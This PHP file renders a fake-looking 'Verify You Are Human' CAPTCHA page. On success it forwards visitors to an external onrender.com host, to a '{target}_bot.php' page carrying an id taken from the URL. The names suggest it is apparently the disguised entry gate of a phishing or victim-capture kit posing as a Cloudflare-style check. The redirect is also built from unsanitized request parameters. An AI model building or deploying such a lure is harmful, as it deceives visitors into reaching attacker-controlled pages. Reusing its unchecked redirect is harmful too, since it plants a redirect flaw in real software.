<?php
session_start();
function generateCaptcha() {
    $chars = 'ABCDEFGHJKLMNPQRSTUVWXYZ23456789';
    $captcha = '';
    for ($i = 0; $i < 6; $i++) {
        $captcha .= $chars[rand(0, strlen($chars) - 1)];
    }
    return $captcha;
}
if (!isset($_SESSION['captcha'])) $_SESSION['captcha'] = generateCaptcha();
if (isset($_POST['captcha'])) {
    if (strtoupper($_POST['captcha']) == $_SESSION['captcha']) {
        $target = $_GET['target'] ?? 'cf';
        header("Location: https://rootx-eye-1.onrender.com/{$target}_bot.php?id=" . ($_GET['id'] ?? ''));
        exit;
    } else {
        $error = "❌ Invalid CAPTCHA!";
        $_SESSION['captcha'] = generateCaptcha();
    }
}
?>
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Verify You Are Human</title>
    <style>
        * { margin:0; padding:0; box-sizing:border-box; }
        body { background:#0a0a1a; font-family:'Segoe UI'; display:flex; justify-content:center; align-items:center; min-height:100vh; color:#fff; }
        .card { background:rgba(255,255,255,0.05); padding:40px; border-radius:20px; border:1px solid rgba(255,255,255,0.1); max-width:400px; width:90%; text-align:center; }
        .captcha-text { font-size:32px; font-weight:bold; letter-spacing:8px; color:#00ff88; font-family:monospace; background:#0a0a1a; padding:10px 20px; border-radius:8px; border:1px solid #00ff88; user-select:none; }
        .captcha-input { width:100%; padding:12px; border:1px solid #333; border-radius:8px; background:#1a1a2e; color:#fff; font-size:18px; text-align:center; letter-spacing:4px; margin:10px 0; }
        .btn { width:100%; padding:14px; border:none; border-radius:10px; font-size:16px; font-weight:bold; cursor:pointer; background:linear-gradient(135deg,#ff0033,#ff0066); color:#fff; }
        .btn:hover { transform:scale(1.02); }
        .error { color:#ff0033; margin-bottom:15px; }
    </style>
</head>
<body>
    <div class="card">
        <h1>🛡️ Verify You Are Human</h1>
        <?php if (isset($error)) echo "<div class='error'>$error</div>"; ?>
        <form method="POST">
            <div class="captcha-text"><?= $_SESSION['captcha'] ?></div>
            <input type="text" class="captcha-input" name="captcha" placeholder="Enter CAPTCHA" maxlength="6" autocomplete="off" required>
            <button type="submit" class="btn">✅ Verify & Continue</button>
        </form>
    </div>
</body>
</html>
